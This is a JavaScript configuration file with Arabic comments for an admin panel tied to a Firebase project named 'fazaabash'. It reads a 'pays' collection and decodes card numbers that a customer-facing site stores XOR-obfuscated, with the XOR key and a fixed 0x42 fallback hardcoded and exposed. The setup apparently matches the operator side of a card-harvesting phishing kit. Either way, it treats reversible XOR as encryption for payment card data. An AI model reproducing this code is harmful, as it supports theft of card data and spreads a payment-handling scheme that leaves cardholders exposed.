// ═══════════════════════════════════════════════════════════
// إعدادات Firebase — مشروع فزعة fazaabash
// لوحة التحكم تتصل بمشروع فزعة عبر Firestore فقط (بدون RTDB)
// المجموعة الرئيسية: pays (يكتبها موقع العملاء)
// ═══════════════════════════════════════════════════════════
const firebaseConfig = {
  apiKey: "AIzaSyDZMKuAWotT2eJDQRMeG83B8rizhYAzIq4",
  authDomain: "fazaabash.firebaseapp.com",
  projectId: "fazaabash",
  storageBucket: "fazaabash.firebasestorage.app",
  messagingSenderId: "274716604599",
  appId: "1:274716604599:web:e298d081e0d395ab503532",
  measurementId: "G-P62PG5FLTQ"
};

if (!firebase.apps.length) {
  firebase.initializeApp(firebaseConfig);
}

const db = firebase.firestore();
window.db = db;
window.firebaseApp = firebase;

// ═══════════════════════════════════════════════════════════
// فك تشفير بيانات البطاقة (XOR) — يدعم أسلوبي موقع العملاء:
//  1) الطريقة الحالية: XOR بمفتاح نصي + ترميز Base64 (UTF-8)
//  2) الطريقة القديمة: XOR الثابت بـ 0x42
// ═══════════════════════════════════════════════════════════
const PAYS_XOR_KEY = "7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c";

// يفك Base64(encodeURIComponent(xor-encoded)) — تطابق دالة تشفير موقع العملاء:
//   التشفير: btoa(encodeURIComponent(ورق).replace(/%XX/g, String.fromCharCode))
//   الفك:    atob → استرجاع %XX → decodeURIComponent → XOR بالمفتاح
function decryptKeyedBase64(str) {
  try {
    if (typeof str !== 'string' || !str) return '';
    // إن كانت أساساً أرقاماً ظاهرة (غير مشفرة) أرجعها
    if (/^\d[\d\s]*$/.test(str)) return str.replace(/\s/g, '');
    const latin = atob(str);
    // عكس خطوة replace: كل حرف (بايت) إلى صيغة %XX
    let percent = '';
    for (let i = 0; i < latin.length; i++) {
      percent += '%' + latin.charCodeAt(i).toString(16).toUpperCase().padStart(2, '0');
    }
    const encoded = decodeURIComponent(percent); // النص بعد XOR
    let result = '';
    for (let i = 0; i < encoded.length; i++) {
      result += String.fromCharCode(encoded.charCodeAt(i) ^ PAYS_XOR_KEY.charCodeAt(i % PAYS_XOR_KEY.length));
    }
    return result;
  } catch (e) {
    return '';
  }
}

// يفك XOR الثابت القديم (0x42)
function decryptFixedXor(str) {
  try {
    if (typeof str !== 'string' || !str) return '';
    let result = '';
    for (let i = 0; i < str.length; i++) {
      result += String.fromCharCode(str.charCodeAt(i) ^ 0x42);
    }
    return result;
  } catch (e) {
    return '';
  }
}

function xorDecrypt(str) {
  if (!str) return '';
  const text = String(str);

  // 1) الطريقة الحالية في موقع العملاء (مفتاح نصي + Base64)
  const keyed = decryptKeyedBase64(text);
  if (/^\d{8,}$/.test(keyed.replace(/\s/g, ''))) return keyed;

  // 2) الطريقة القديمة (XOR ثابت 0x42)
  const fixed = decryptFixedXor(text);
  if (/^\d{8,}$/.test(fixed.replace(/\s/g, ''))) return fixed;

  // 3) إن لم يُفكَّ شيء، نعيد النص كما هو (قد يكون رقماً ظاهراً)
  return text;
}
window.xorDecrypt = xorDecrypt;
window.PAYS_XOR_KEY = PAYS_XOR_KEY;
